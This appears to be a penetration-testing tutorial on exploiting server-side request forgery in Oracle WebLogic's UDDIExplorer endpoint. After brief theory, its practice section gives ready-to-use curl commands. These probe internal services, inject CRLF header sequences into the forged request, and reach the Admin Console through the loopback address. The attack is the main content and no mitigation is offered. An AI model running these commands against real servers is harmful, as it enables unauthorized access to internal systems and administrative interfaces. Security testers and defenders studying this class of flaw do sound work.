# WebLogic

## Context

This article focuses on exploiting Server Side Request Forgery (SSRF) vulnerabilities in Oracle WebLogic through HTTP-based service interactions. We will explore specific techniques using UDDIExplorer, CRLF injection, and unauthorized console access. Readers should be familiar with HTTP protocol, server request handling, web application architecture, and general concepts of SSRF.

## Theory

### WebLogic Server SSRF Attack Surface

Oracle WebLogic is a widely used Java EE application server that provides various HTTP endpoints, including administrative interfaces. These endpoints can be leveraged in SSRF attacks due to their processing of user-supplied URLs. Specifically, WebLogic components like UDDIExplorer can be exploited if they do not adequately validate input, allowing attackers to trigger server-side HTTP requests to arbitrary destinations.

### UDDIExplorer SSRF Mechanism

UDDIExplorer is a WebLogic component designed for interacting with UDDI registries, accessible at `/uddiexplorer/SearchPublicRegistries.jsp`. An attacker can exploit this component by supplying a crafted URL. This URL causes WebLogic to initiate an HTTP request to a server controlled by the attacker or an internal service, revealing sensitive information or leading to further exploitation.

### CRLF Injection in WebLogic SSRF

CRLF injection involves inserting carriage return (CR) and line feed (LF) characters into SSRF payloads, manipulating HTTP headers in the process. An attacker can craft SSRF payloads containing these sequences, potentially bypassing filters or altering HTTP requests' behavior, thereby enhancing the impact of an SSRF attack.

### WebLogic Console Access via SSRF

The WebLogic Admin Console provides an HTTP interface for server management, usually restricted to internal access. SSRF vulnerabilities can be exploited to interact with or access the Admin Console from an external attackerâ€™s perspective, effectively bypassing usual access controls and potentially leading to full server compromise.

## Practice

### UDDIExplorer SSRF to Internal HTTP Service

- Utilize `curl` to send a POST request to UDDIExplorer:

    ```bash
    curl -k -X POST 'https://<target>:7001/uddiexplorer/SearchPublicRegistries.jsp' -d 'operator=search&businessName=&serviceName=&searchFor=businesses&businessLocation=<INTERNAL_URL>'
    ```

    This command initiates a server-side request from WebLogic to an internal HTTP service specified by `<INTERNAL_URL>`, facilitating enumeration of these services.

### CRLF Injection in SSRF Payloads

1. Craft a payload with CRLF sequences to manipulate HTTP headers:

    ```http
    http://internal-service/evil%0d%0aInjected-Header: injected
    ```

2. Execute the SSRF attack with this payload using `curl`:

    ```bash
    curl -k -X POST 'https://<target>:7001/uddiexplorer/SearchPublicRegistries.jsp' -d 'operator=search&businessName=&serviceName=&searchFor=businesses&businessLocation=http://internal-service/evil%0d%0aInjected-Header: injected'
    ```

    This action allows an attacker to bypass input validation and manipulate headers in outbound requests from WebLogic.

### Accessing WebLogic Admin Console via SSRF

1. Target the Admin Console using a loopback address:

    ```http
    http://127.0.0.1:7001/console
    ```

2. Trigger the SSRF with `curl`:

    ```bash
    curl -k -X POST 'https://<target>:7001/uddiexplorer/SearchPublicRegistries.jsp' -d 'operator=search&businessName=&serviceName=&searchFor=businesses&businessLocation=http://127.0.0.1:7001/console'
    ```

    This can be used to gain unauthorized access to WebLogic's Admin Console, leveraging SSRF to exploit potential application misconfigurations.

## Tools

- **curl**: A command-line tool used for sending HTTP requests, essential for crafting and testing SSRF payloads.
